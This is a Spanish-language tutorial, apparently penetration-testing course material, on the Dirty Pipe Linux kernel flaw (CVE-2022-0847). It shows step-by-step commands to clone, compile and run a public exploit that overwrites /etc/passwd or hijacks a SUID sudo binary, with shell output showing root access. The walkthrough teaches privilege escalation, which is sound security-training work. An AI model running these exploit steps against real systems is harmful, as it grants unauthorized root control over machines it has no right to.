Una vulnerabilidad en el kernel de Linux, llamada [Dirty Pipe](https://dirtypipe.cm4all.com/) ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)), permite la escritura no autorizada en archivos del usuario root en Linux. Técnicamente, la vulnerabilidad es similar a la vulnerabilidad [Dirty Cow](https://dirtycow.ninja/) descubierta en 2016. Todos los kernels desde la versión `5.8` hasta la `5.17` están afectados y son vulnerables a esta vulnerabilidad.

En términos simples, esta vulnerabilidad permite a un usuario escribir en archivos arbitrarios siempre que tenga acceso de lectura a estos archivos. También es interesante notar que los teléfonos Android también están afectados. Las aplicaciones Android se ejecutan con derechos de usuario, por lo que una aplicación maliciosa o comprometida podría tomar el control del teléfono.

Esta vulnerabilidad se basa en pipes. Los pipes son un mecanismo de comunicación unidireccional entre procesos que son particularmente populares en sistemas Unix. Por ejemplo, podríamos editar el archivo `/etc/passwd` y eliminar el aviso de contraseña para el root. Esto nos permitiría iniciar sesión con el comando `su` sin el aviso de contraseña.

Para explotar esta vulnerabilidad, necesitamos descargar un [PoC (Proof of Concept)](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) y compilarlo en el sistema objetivo o en una copia que hayamos hecho.

### Download Dirty Pipe Exploit

```r
cry0l1t3@nix02:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cry0l1t3@nix02:~$ cd CVE-2022-0847-DirtyPipe-Exploits
cry0l1t3@nix02:~$ bash compile.sh
```

Después de compilar el código, tenemos dos exploits diferentes disponibles. La primera versión del exploit (`exploit-1`) modifica el archivo `/etc/passwd` y nos da un prompt con privilegios de root. Para esto, necesitamos verificar la versión del kernel y luego ejecutar el exploit.

### Verify Kernel Version

```r
cry0l1t3@nix02:~$ uname -r

5.13.0-46-generic
```

### Exploitation

```r
cry0l1t3@nix02:~$ ./exploit-1

Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

id

uid=0(root) gid=0(root) groups=0(root)
```

Con la ayuda de la segunda versión del exploit (`exploit-2`), podemos ejecutar binarios SUID con privilegios de root. Sin embargo, antes de poder hacer eso, primero necesitamos encontrar estos binarios SUID. Para esto, podemos usar el siguiente comando:

### Find SUID Binaries

```r
cry0l1t3@nix02:~$ find / -perm -4000 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/newgrp
```

Luego podemos elegir un binario y especificar la ruta completa del binario como un argumento para el exploit y ejecutarlo.

### Exploitation

```r
cry0l1t3@nix02:~$ ./exploit-2 /usr/bin/sudo

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambas
```